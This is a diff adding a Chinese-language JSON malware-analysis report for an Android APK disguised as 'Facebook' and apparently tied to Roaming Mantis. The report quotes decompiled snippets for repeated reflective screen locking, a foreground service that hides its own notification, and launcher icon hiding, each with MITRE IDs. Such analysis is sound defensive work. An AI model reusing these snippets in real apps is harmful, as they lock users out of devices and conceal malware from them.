@@ -1,0 +1,118 @@
+{
+  "APK信息": {
+    "文件名": "29e309dbb4873fe43e279010932735baff53b32da95263079e06080a29a875b4.apk",
+    "sha256": "29e309dbb4873fe43e279010932735baff53b32da95263079e06080a29a875b4",
+    "包名": "fgsd.werwe.dfgs",
+    "应用名": "Facebook",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 160.7
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\a;",
+          "method_signature": "if(i2 >= 70)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]);",
+          "malicious_code_snippet_context": "                          return;\n                      }\n                      try {\n>>>                         systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]);\n                          Thread.sleep(99L);\n                      } catch (Exception e) {\n                          e.printStackTrace();",
+          "behavior_description": "该代码在后台线程中循环70次，每次通过Java反射机制动态调用系统服务（DevicePolicyManager）的lockNow()方法立即锁定屏幕，每次间隔99毫秒。使用反射（getClass().getMethod(\"lockNow\").invoke()）而非直接调用，是为了规避静态分析检测。高频反复锁屏使用户解锁后立即被再次锁定，无法正常使用设备，是典型的勒索软件设备锁定行为，与厂商报告中Roaming Mantis恶意软件的锁屏勒索功能吻合。数据流向：systemService（DevicePolicyManager系统服务实例）→ 反射调用lockNow()（强制锁屏危险操作）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\as\\dfCancelNoticeService;",
+          "method_signature": "if(Build.VERSION.SDK_INT > 18)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT > 18) {\n    Notification.Builder builder = new Notification.Builder(this);\n    builder.setSmallIcon(R.mipmap.icon);\n    startForeground(sgMainService.a, builder.build());\n    ((NotificationManager) getSystemService(\"notification\")).cancel(sgMainService.a);\n    stopSelf();\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.app.Service\n      public int onStartCommand(Intent intent, int i, int i2) {\n>>>         if (Build.VERSION.SDK_INT > 18) {\n>>>             Notification.Builder builder = new Notification.Builder(this);\n>>>             builder.setSmallIcon(R.mipmap.icon);\n>>>             startForeground(sgMainService.a, builder.build());\n>>>             new Thread(new Runnable() { // from class: com.as.dfCancelNoticeService.1\n>>>                 @Override // java.lang.Runnable\n>>>                 public void run() {\n                      try {\n                          dfCancelNoticeService.this.a();\n                          ((NotificationManager) dfCancelNoticeService.this.getSystemService(\"notification\")).cancel(sgMainService.a);",
+          "behavior_description": "该服务 dfCancelNoticeService 在 onStartCommand 中检测系统版本（Build.VERSION.SDK_INT > 18）后，构造一个仅含图标的通知，并使用与恶意主服务 sgMainService 相同的通知 ID（sgMainService.a）调用 startForeground() 将自身提升为前台服务以获得高优先级、避免被系统回收；随后在线程中通过 NotificationManager.cancel(sgMainService.a) 撤销该通知并 stopSelf()。由于两个服务共用同一通知 ID，取消操作会同时隐藏主服务的通知，最终形成'前台优先级保活 + 通知栏无感知'的隐蔽驻留机制，使恶意主服务 sgMainService（Roaming Mantis 样本）得以在用户毫无察觉的情况下长期驻留后台运行，规避 Android 前台服务必须展示通知的透明性要求。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\fde\\gsActivity;",
+          "method_signature": "run()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "gsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gsActivity.this.getPackageName(), gsActivity.class.getName()), 2, 1);",
+          "malicious_code_snippet_context": "              @Override // java.lang.Runnable\n              public void run() {\n                  try {\n>>>                     gsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gsActivity.this.getPackageName(), gsActivity.class.getName()), 2, 1);\n                  } catch (Exception e) {\n                      e.printStackTrace();\n                  }",
+          "behavior_description": "在主 Activity 的 onCreate() 中，通过匿名 Runnable 调用 PackageManager.setComponentEnabledSetting()，将应用自身的启动 Activity 组件设置为禁用状态（参数 2 即 COMPONENT_ENABLED_STATE_DISABLED，参数 1 即 DONT_KILL_APP）。数据流向：应用自身包名与 Activity 类名（source）→ setComponentEnabledSetting 禁用组件（sink）。组件被禁用后，应用图标立即从桌面启动器中消失，用户无法通过图标定位和卸载该应用，属于典型的恶意软件图标隐藏/隐蔽驻留技术，与 Roaming Mantis 等恶意家族的持久化规避手法一致，为后续窃取敏感信息等恶意行为提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
